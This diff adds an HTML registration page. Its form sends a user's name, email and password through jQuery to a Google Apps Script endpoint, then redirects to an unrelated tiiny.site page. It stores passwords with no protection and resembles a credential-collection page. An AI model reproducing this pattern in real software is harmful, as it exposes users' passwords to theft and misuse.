@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Basic HTML Form</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA1L2ZsMjM0MTcwNjg4MTItaW1hZ2Uta3FhcDlyZHcuanBn.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: white;
+            font-size: 36px;
+        }
+        .form-container {
+            background-color: rgba(255, 255, 255, 0.5); /* More translucent background */
+            padding: 25px;
+            border-radius: 5px;
+            width: 500px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-container label {
+            display: block;
+            margin-bottom: 8px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .form-container input[type="submit"] {
+            background-color: #45a049;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .form-container input[type="submit"]:hover {
+            background-color: #3d8c40;
+        }
+
+        /* Loading spinner styles */
+        .spinner {
+            display: none; /* Hidden by default */
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid #45a049;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <!-- Include jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <h1>Register Now</h1>
+    <div class="form-container">
+        <form method="post" id="frmSubmit">
+            <!-- Name Field -->
+            <label for="name">Name:</label>
+            <input type="text" class="input" name="name" required>
+
+            <!-- Email Field -->
+            <label for="email">Email:</label>
+            <input type="email" class="input" name="email" required>
+
+            <!-- Password Field -->
+            <label for="password">Password:</label>
+            <input type="password" class="input" name="password" required>
+
+            <!-- Submit Button -->
+            <input type="submit" id="btnSubmit">
+            <div id="msg"></div>
+            <div class="spinner" id="spinner"></div> <!-- Spinner Element -->
+        </form>
+    </div>
+    <script>
+        jQuery('#frmSubmit').on('submit', function(e) {
+            e.preventDefault();
+            jQuery('#msg').html('Please wait...');
+            jQuery('#btnSubmit').attr('disabled', true);
+            jQuery('#spinner').show(); // Show the loading spinner
+
+            jQuery.ajax({
+                url: 'https://script.google.com/macros/s/AKfycbyARRFG0VOLEiidVdOL7B4EXX16XFH8HB7OHSHlPGUXb4TM3zjbYxhp6Hn7Id15keWF/exec',
+                type: 'post',
+                data: jQuery('#frmSubmit').serialize(),
+                success: function(result) {
+                    jQuery('#frmSubmit')[0].reset();
+                    jQuery('#msg').html('Thank You');
+                    jQuery('#btnSubmit').attr('disabled', false);
+                    jQuery('#spinner').hide(); // Hide the spinner after success
+                    // Redirect to the specified URL after success
+                    setTimeout(function() {
+                        window.location.href = 'https://play-ani.tiiny.site/';
+                    }, 2000); // Redirect after 2 seconds
+                },
+                error: function(xhr, status, error) {
+                    jQuery('#msg').html('An error occurred: ' + error);
+                    jQuery('#btnSubmit').attr('disabled', false);
+                    jQuery('#spinner').hide(); // Hide the spinner in case of error
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
+
+
